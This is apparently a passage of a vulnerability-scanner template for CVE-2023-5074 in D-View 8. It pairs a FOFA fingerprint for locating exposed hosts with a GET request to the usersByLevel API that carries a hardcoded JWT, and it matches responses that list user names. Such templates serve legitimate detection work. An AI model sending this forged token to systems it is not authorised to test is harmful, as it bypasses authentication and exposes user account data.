  tags:
  - CVE-2023-5074
  - 硬编码凭据
  finger: d-view_8
  fofa: icon_hash="-1317621215"
requests:
- method: GET
  path: /dview8/api/usersByLevel
  headers:
    Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0..5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI
  expression: 'status_code == 200

    && contains(body,"\"code\" : 200")

    && contains(body,"userName")

    && contains(body,"\"success\" : true")

    && !contains(body,"<")

